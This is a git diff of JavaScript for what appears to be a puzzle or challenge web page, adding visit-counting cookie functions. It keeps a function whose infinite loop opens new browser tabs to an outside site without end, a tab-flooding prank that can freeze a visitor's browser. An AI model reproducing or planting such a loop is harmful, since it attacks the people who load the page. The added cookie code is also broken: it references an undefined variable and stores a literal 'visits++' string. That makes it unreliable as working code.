@@ -53,9 +53,49 @@ function openLinks(){
    }
   }
 
-  function shit(){
-    while(true){
-      window.open("https://harvisha.weebly.com",'_blank');
-      window.focus();
+function shit(){
+  while(true){
+    window.open("https://harvisha.weebly.com",'_blank');
+    window.focus();
+  }
+  }
+
+let visits = 0;
+/*
+  function setCookie() {
+    if(visits == 0){
+    document.cookie = "visits=1; expires=Thu, 25 Dec 2100 12:00:00 UTC";
     }
-   }
+    else{
+    document.cookie = "visits++; expires=Thu, 25 Dec 2100 12:00:00 UTC";
+    }
+}*/
+  
+function getCookie(cname) {
+  let name = cname + "=";
+  let decodedCookie = decodeURIComponent(document.cookie);
+  let ca = decodedCookie.split(';');
+  for(let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
+  
+function checkCookie() {
+  let numVisits = getCookie("visits");
+  if (numVisits > 0) {
+    alert("You've come back here " + user + " times and you still haven't solved the challenge?");
+    document.cookie = "visits++; expires=Thu, 25 Dec 2100 12:00:00 UTC";
+  } 
+  else {
+    if (numVisits == 0) {
+      document.cookie = "visits=1; expires=Thu, 25 Dec 2100 12:00:00 UTC";
+    }
+  }
+}
